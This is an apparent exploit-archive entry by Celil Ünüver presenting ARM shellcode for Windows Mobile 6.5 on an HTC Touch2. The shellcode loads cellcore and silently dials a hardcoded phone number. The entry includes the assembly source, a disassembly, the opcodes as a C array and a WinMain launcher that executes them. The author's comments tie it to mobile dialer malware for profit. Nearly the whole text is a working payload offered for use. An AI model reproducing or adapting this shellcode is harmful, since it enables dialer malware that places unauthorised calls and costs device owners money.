Title: Windows Mobile 6.5 TR Phone Call Shellcode
Author: Celil Ünüver
/*

Device: HTC Touch2
System: Windows Mobile 6.5 TR (WinCE 5.0.2)

Coded by Celil ‹n¸ver from SecurityArchitect

Contact:
	celilunuver[n*spam]gmail.com
	www.securityarchitect.org
	blog.securityarchitect.org


Notes: thats a PhoneCall Shellcode! Do you remember the time of dialers? Dial-up Modem times? ;)

now is it the time of mobile dialers and malwares to make $$ ? :)


		EXPORT	start
		AREA	.text, CODE
start
		ldr	R12, =0x3f6272c
		adr	r0, lib
		mov	lr, pc
		mov	pc, r12
		ldr	r12, =0x2e806dc
		adr	r0, num
		mov	r3, #0
		mov	r2, #0
		mov	r1, #0
		mov	lr, pc
		mov	pc, r12

lib		dcb	"c",0,"e",0,"l",0,"l",0,"c",0,"o",0,"r",0,"e",0,0,0,0,0
num		dcb	"3",0,"1",0,"3",0,"3",0,"7",0,0,0
		ALIGN

		END

 dumpbin /disasm:

00011000: E59FC044 ldr       r12, [pc, #0x44]
00011004: E28F0020 add       r0, pc, #0x20
00011008: E1A0E00F mov       lr, pc
0001100C: E1A0F00C mov       pc, r12
00011010: E59FC038 ldr       r12, [pc, #0x38]
00011014: E28F0024 add       r0, pc, #0x24
00011018: E3A03000 mov       r3, #0
0001101C: E3A02000 mov       r2, #0
00011020: E3A01000 mov       r1, #0
00011024: E1A0E00F mov       lr, pc
00011028: E1A0F00C mov       pc, r12
0001102C: 00650063 rsbeq     r0, r5, r3, rrx
00011030: 006C006C rsbeq     r0, r12, r12, rrx
00011034: 006F0063 rsbeq     r0, pc, r3, rrx
00011038: 00650072 rsbeq     r0, r5, r2, ror r0
0001103C: 00000000 andeq     r0, r0, r0
00011040: 00310033 eoreqs    r0, r1, r3, lsr r0
00011044: 00330033 eoreqs    r0, r3, r3, lsr r0
00011048: 00000037 andeq     r0, r0, r7, lsr r0
0001104C: 03F6272C
00011050: 02E806DC rsceq     r0, r8, #0xDC, 12


"i don't think we have any imperfections; we perfectly are what we are."

*/

#include <stdio.h>
#include <windows.h>

int shellcode[] =
{
0xE59FC044,
0xE28F0020,
0xE1A0E00F,
0xE1A0F00C,
0xE59FC038,
0xE28F0024,
0xE3A03000,
0xE3A02000,
0xE3A01000,
0xE1A0E00F,
0xE1A0F00C,
0x00650063,
0x006C006C,
0x006F0063,
0x00650072,
0x00000000,
0x00310033,
0x00330033,
0x00000037,
0x03F6272C,
0x02E806DC,
};

int WINAPI WinMain( HINSTANCE hInstance,
                    HINSTANCE hPrevInstance,
                    LPTSTR    lpCmdLine,
                    int       nCmdShow)
{
    ((void (*)(void)) & shellcode)();

    return 0;
}